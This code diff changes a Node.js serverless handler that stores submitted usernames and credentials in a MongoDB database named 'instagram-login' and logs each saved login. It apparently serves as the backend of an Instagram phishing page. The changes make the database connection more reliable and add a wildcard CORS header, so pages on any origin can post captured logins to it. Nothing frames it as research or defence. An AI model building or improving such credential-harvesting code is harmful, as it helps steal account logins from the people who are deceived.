@@ -1,21 +1,29 @@
 const { MongoClient } = require("mongodb");
 
-let cachedClient = null;
+// Reuse connection across warm serverless invocations
+let client = null;
 
 async function getDb() {
-  if (cachedClient) {
-    return cachedClient.db("instagram-login");
+  if (!client || !client.topology || !client.topology.isConnected()) {
+    client = new MongoClient(process.env.MONGODB_URI, {
+      tls: true,
+      serverSelectionTimeoutMS: 5000,
+    });
+    await client.connect();
   }
-
-  const client = new MongoClient(process.env.MONGODB_URI, {
-    tls: true,
-  });
-  await client.connect();
-  cachedClient = client;
   return client.db("instagram-login");
 }
 
 module.exports = async function handler(req, res) {
+  // Allow CORS for same-origin fetch
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
+
+  if (req.method === "OPTIONS") {
+    return res.status(200).end();
+  }
+
   if (req.method !== "POST") {
     return res.status(405).json({ success: false, message: "Method not allowed" });
   }
@@ -41,7 +49,7 @@ module.exports = async function handler(req, res) {
     console.log(`Saved credentials for: ${username}`);
     return res.status(200).json({ success: true, message: "Credentials saved successfully!" });
   } catch (error) {
-    console.error("Database error:", error);
+    console.error("Database error:", error.message);
     return res.status(500).json({ success: false, message: "Server error. Try again." });
   }
 };
